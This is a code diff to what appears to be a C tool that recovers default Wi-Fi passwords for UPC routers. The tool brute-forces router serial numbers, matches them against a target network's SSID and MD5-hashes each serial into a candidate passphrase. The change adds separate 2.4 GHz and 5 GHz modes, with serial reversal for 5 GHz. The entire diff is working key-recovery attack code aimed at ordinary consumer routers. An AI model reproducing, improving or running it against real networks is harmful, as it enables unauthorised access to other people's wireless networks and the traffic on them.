@@ -108,13 +108,28 @@ int original_main(int argc, char *argv[])
 {
     uint32_t buf[4], target;
     char serial[64];
+    char serial_input[64];
     char pass[9], tmpstr[17];
     uint8_t h1[16], h2[16];
     uint32_t hv[4], w1, w2, i, cnt=0;
+    int mode = 0;
 
     banner();
 
-    if(argc != 2) {
+    if(argc != 3) {
+        usage(argv[0]);
+        return 1;
+    }
+
+    if (strlen(argv[1]) != 10 || memcmp(argv[1], "UPC", 3) != 0) {
+        usage(argv[0]);
+        return 1;
+    }
+
+    if (strcmp(argv[2], "24") == 0) mode = 1;
+    else if (strcmp(argv[2], "5") == 0) mode = 2;
+
+    if (mode == 0) {
         usage(argv[0]);
         return 1;
     }
@@ -127,17 +142,27 @@ int original_main(int argc, char *argv[])
         for (buf[1] = 0; buf[1] <= MAX1; buf[1]++)
             for (buf[2] = 0; buf[2] <= MAX2; buf[2]++)
                 for (buf[3] = 0; buf[3] <= MAX3; buf[3]++) {
-                    if(upc_generate_ssid(buf, MAGIC_24GHZ) != target &&
-                       upc_generate_ssid(buf, MAGIC_5GHZ) != target) {
+                    if (mode == 1 && upc_generate_ssid(buf, MAGIC_24GHZ) != target)
                         continue;
-                    }
+
+                    if (mode == 2 && upc_generate_ssid(buf, MAGIC_5GHZ) != target)
+                        continue;
 
                     cnt++;
 
                     sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
+                    memset(serial_input, 0, 64);
+
+                    if (mode == 2) {
+                        for(i=0; i<strlen(serial); i++) {
+                            serial_input[strlen(serial)-1-i] = serial[i];
+                        }
+                    } else {
+                        memcpy(serial_input, serial, strlen(serial));
+                    }
 
                     MD5_Init(&ctx);
-                    MD5_Update(&ctx, serial, strlen(serial));
+                    MD5_Update(&ctx, serial_input, strlen(serial_input));
                     MD5_Final(h1, &ctx);
 
                     for (i = 0; i < 4; i++) {
